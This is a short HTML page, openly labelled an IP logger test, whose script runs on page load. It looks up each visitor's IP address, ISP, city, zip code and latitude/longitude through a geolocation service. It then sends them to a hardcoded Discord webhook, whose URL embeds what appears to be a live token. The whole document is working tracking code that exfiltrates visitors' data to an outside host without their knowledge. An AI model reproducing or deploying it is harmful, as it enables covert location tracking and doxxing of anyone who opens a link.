<!DOCTYPE html>
<html>
<head>
    <title>IP Logger Test</title>
    <script>
        // Discord webhook URL
        var webHookUrl = "https://discord.com/api/webhooks/1338299297292226590/vG66beFgowK_JWnSqaeHltm50_Wl7R26AGggIGdc_Xpw71OqDh4NriFFAzk4hWX5PCNB";

        // IP Logger function
        async function logIP() {
            try {
                // Fetch IP and geolocation data from ip-api.com
                const response = await fetch('https://ip-api.com/json/');
                if (!response.ok) throw new Error(`IP-API fetch failed: ${response.status}`);
                const data = await response.json();
                console.log("IP data:", data);

                // Extract data
                var ip = data.query || "Unknown IP";
                var provider = (data.org && data.as) ? `${data.org} (${data.as})` : "Unknown Provider";
                var timezone = data.timezone || "Unknown Timezone";
                var country = data.country || "Unknown Country";
                var countryCode = data.countryCode ? data.countryCode.toLowerCase() : "xx";
                var region = (data.region && data.regionName) ? `${data.region} (${data.regionName})` : "Unknown Region";
                var city = data.city || "Unknown City";
                var zip = data.zip || "Unknown Zip";
                var lat = data.lat || "Unknown Latitude";
                var lon = data.lon || "Unknown Longitude";

                // Prepare Discord payload
                var postRequest = new XMLHttpRequest();
                postRequest.open("POST", webHookUrl);
                postRequest.setRequestHeader('Content-type', 'application/json');

                var params = {
                    username: "IP Logger",
                    avatar_url: "https://i.imgur.com/xyz123.png", // Optional avatar (replace or remove)
                    content: "__**:globe_with_meridians: IP-Address:**__ \n" 
                            + "`" + ip + "`" + 
                            "\n \n__**:telephone: Provider:**__ \n" 
                            + provider + 
                            "\n \n__**:map: Timezone:**__ \n" 
                            + timezone + 
                            "\n \n__**:flag_" + countryCode + ": Country and Region:**__ \n" 
                            + country + " - " + region + 
                            "\n \n__**:cityscape: Zip Code & City:**__ \n" 
                            + zip + " " + city +
                            "\n \n__**:round_pushpin: Location:**__ \n" 
                            + "**Longitude:** " + lon + "\n"
                            + "**Latitude:** " + lat
                };

                // Handle response
                postRequest.onload = function() {
                    if (postRequest.status === 204) {
                        console.log("IP sent to webhook!");
                    } else {
                        console.error("Webhook failed with status:", postRequest.status);
                    }
                };
                postRequest.onerror = function() {
                    console.error("Webhook request error");
                };

                // Send the data
                postRequest.send(JSON.stringify(params));
            } catch (error) {
                console.error("IP logger error:", error);

                // Send error to Discord as fallback
                var errorRequest = new XMLHttpRequest();
                errorRequest.open("POST", webHookUrl);
                errorRequest.setRequestHeader('Content-type', 'application/json');
                var errorParams = {
                    username: "IP Logger",
                    content: "IP Logger Error: " + error.message
                };
                errorRequest.send(JSON.stringify(errorParams));
            }
        }

        // Run on load
        window.onload = function() {
            logIP();
        };

        // Manual trigger for testing
        function manualTrigger() {
            logIP();
        }
    </script>
</head>
<body>
    <h1>IP Logger Test Page</h1>
    <button onclick="manualTrigger()">Log IP Again</button>
    <p>Open console (F12) to see debug info.</p>
</body>
</html>
